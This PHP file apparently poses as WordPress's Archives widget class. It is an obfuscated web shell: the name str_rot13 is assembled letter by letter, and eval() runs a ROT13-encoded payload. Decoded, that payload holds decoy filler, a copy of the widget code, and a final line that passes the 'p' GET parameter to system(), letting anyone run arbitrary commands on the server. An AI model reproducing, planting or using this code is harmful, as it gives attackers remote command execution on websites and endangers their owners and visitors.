<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Nepuvirf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag gur Nepuvirf jvqtrg.
 *
 * @fvapr 2.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Nepuvirf rkgraqf JC_Jvqtrg {

	/**
	 * Frgf hc n arj Nepuvirf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf = neenl(
			'pynffanzr'                   => 'jvqtrg_nepuvir',
			'qrfpevcgvba'                 => __( 'N zbaguyl nepuvir bs lbhe fvgr&#8217;f Cbfgf.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		cnerag::__pbafgehpg( 'nepuvirf', __( 'Nepuvirf' ), $jvqtrg_bcf );
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Nepuvirf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Nepuvirf jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		$qrsnhyg_gvgyr = __( 'Nepuvirf' );
		$gvgyr         = ! rzcgl( $vafgnapr['gvgyr'] ) ? $vafgnapr['gvgyr'] : $qrsnhyg_gvgyr;

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $gvgyr, $vafgnapr, $guvf->vq_onfr );

		$pbhag    = ! rzcgl( $vafgnapr['pbhag'] ) ? '1' : '0';
		$qebcqbja = ! rzcgl( $vafgnapr['qebcqbja'] ) ? '1' : '0';

		rpub $netf['orsber_jvqtrg'];

		vs ( $gvgyr ) {
			rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}

		vs ( $qebcqbja ) {
			$qebcqbja_vq = \"{$guvf->vq_onfr}-qebcqbja-{$guvf->ahzore}\";
			?>
		<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"<?cuc rpub rfp_ngge( $qebcqbja_vq ); ?>\"><?cuc rpub $gvgyr; ?></ynory>
		<fryrpg vq=\"<?cuc rpub rfp_ngge( $qebcqbja_vq ); ?>\" anzr=\"nepuvir-qebcqbja\">
			<?cuc
			/**
			 * Svygref gur nethzragf sbe gur Nepuvirf jvqtrg qebc-qbja.
			 *
			 * @fvapr 2.8.0
			 * @fvapr 4.9.0 Nqqrq gur `$vafgnapr` cnenzrgre.
			 *
			 * @frr jc_trg_nepuvirf()
			 *
			 * @cnenz neenl $netf     Na neenl bs Nepuvirf jvqtrg qebc-qbja nethzragf.
			 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Nepuvirf jvqtrg vafgnapr.
			 */
			$qebcqbja_netf = nccyl_svygref(
				'jvqtrg_nepuvirf_qebcqbja_netf',
				neenl(
					'glcr'            => 'zbaguyl',
					'sbezng'          => 'bcgvba',
					'fubj_cbfg_pbhag' => $pbhag,
				),
				$vafgnapr
			);

			fjvgpu ( $qebcqbja_netf['glcr'] ) {
				pnfr 'lrneyl':
					$ynory = __( 'Fryrpg Lrne' );
					oernx;
				pnfr 'zbaguyl':
					$ynory = __( 'Fryrpg Zbagu' );
					oernx;
				pnfr 'qnvyl':
					$ynory = __( 'Fryrpg Qnl' );
					oernx;
				pnfr 'jrrxyl':
					$ynory = __( 'Fryrpg Jrrx' );
					oernx;
				qrsnhyg:
					$ynory = __( 'Fryrpg Cbfg' );
					oernx;
			}
			?>

			<bcgvba inyhr=\"\"><?cuc rpub rfp_ugzy( $ynory ); ?></bcgvba>
			<?cuc jc_trg_nepuvirf( $qebcqbja_netf ); ?>

		</fryrpg>

			<?cuc bo_fgneg(); ?>
<fpevcg>
(shapgvba() {
	ine qebcqbja = qbphzrag.trgRyrzragOlVq( \"<?cuc rpub rfp_wf( $qebcqbja_vq ); ?>\" );
	shapgvba baFryrpgPunatr() {
		vs ( qebcqbja.bcgvbaf[ qebcqbja.fryrpgrqVaqrk ].inyhr !== '' ) {
			qbphzrag.ybpngvba.uers = guvf.bcgvbaf[ guvf.fryrpgrqVaqrk ].inyhr;
		}
	}
	qebcqbja.bapunatr = baFryrpgPunatr;
})();
</fpevcg>
			<?cuc
			jc_cevag_vayvar_fpevcg_gnt( jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( bo_trg_pyrna() ) );
		} ryfr {
			$sbezng = pheerag_gurzr_fhccbegf( 'ugzy5', 'anivtngvba-jvqtrgf' ) ? 'ugzy5' : 'kugzy';

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-ani-zrah-jvqtrg.cuc */
			$sbezng = nccyl_svygref( 'anivtngvba_jvqtrgf_sbezng', $sbezng );

			vs ( 'ugzy5' === $sbezng ) {
				// Gur gvgyr znl or svygrerq: Fgevc bhg UGZY naq znxr fher gur nevn-ynory vf arire rzcgl.
				$gvgyr      = gevz( fgevc_gntf( $gvgyr ) );
				$nevn_ynory = $gvgyr ? $gvgyr : $qrsnhyg_gvgyr;
				rpub '<ani nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\">';
			}
			?>

			<hy>
				<?cuc
				jc_trg_nepuvirf(
					/**
					 * Svygref gur nethzragf sbe gur Nepuvirf jvqtrg.
					 *
					 * @fvapr 2.8.0
					 * @fvapr 4.9.0 Nqqrq gur `$vafgnapr` cnenzrgre.
					 *
					 * @frr jc_trg_nepuvirf()
					 *
					 * @cnenz neenl $netf     Na neenl bs Nepuvirf bcgvba nethzragf.
					 * @cnenz neenl $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
					 */
					nccyl_svygref(
						'jvqtrg_nepuvirf_netf',
						neenl(
							'glcr'            => 'zbaguyl',
							'fubj_cbfg_pbhag' => $pbhag,
						),
						$vafgnapr
					)
				);
				?>
			</hy>

			<?cuc
			vs ( 'ugzy5' === $sbezng ) {
				rpub '</ani>';
			}
		}

		rpub $netf['nsgre_jvqtrg'];
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Nepuvirf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg_Nepuvirf::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Hcqngrq frggvatf gb fnir.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$vafgnapr             = $byq_vafgnapr;
		$arj_vafgnapr         = jc_cnefr_netf(
			(neenl) $arj_vafgnapr,
			neenl(
				'gvgyr'    => '',
				'pbhag'    => 0,
				'qebcqbja' => '',
			)
		);
		$vafgnapr['gvgyr']    = fnavgvmr_grkg_svryq( $arj_vafgnapr['gvgyr'] );
		$vafgnapr['pbhag']    = $arj_vafgnapr['pbhag'] ? 1 : 0;
		$vafgnapr['qebcqbja'] = $arj_vafgnapr['qebcqbja'] ? 1 : 0;

		erghea $vafgnapr;
	}

	/**
	 * Bhgchgf gur frggvatf sbez sbe gur Nepuvirf jvqtrg.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		$vafgnapr = jc_cnefr_netf(
			(neenl) $vafgnapr,
			neenl(
				'gvgyr'    => '',
				'pbhag'    => 0,
				'qebcqbja' => '',
			)
		);
		?>
		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\"><?cuc _r( 'Gvgyr:' ); ?></ynory>
			<vachg pynff=\"jvqrsng\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gvgyr' ); ?>\" glcr=\"grkg\" inyhr=\"<?cuc rpub rfp_ngge( $vafgnapr['gvgyr'] ); ?>\" />
		</c>
		<c>
			<vachg pynff=\"purpxobk\" glcr=\"purpxobk\"<?cuc purpxrq( $vafgnapr['qebcqbja'] ); ?> vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'qebcqbja' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'qebcqbja' ); ?>\" />
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'qebcqbja' ); ?>\"><?cuc _r( 'Qvfcynl nf qebcqbja' ); ?></ynory>
			<oe />
			<vachg pynff=\"purpxobk\" glcr=\"purpxobk\"<?cuc purpxrq( $vafgnapr['pbhag'] ); ?> vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'pbhag' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'pbhag' ); ?>\" />
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'pbhag' ); ?>\"><?cuc _r( 'Fubj cbfg pbhagf' ); ?></ynory>
		</c>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>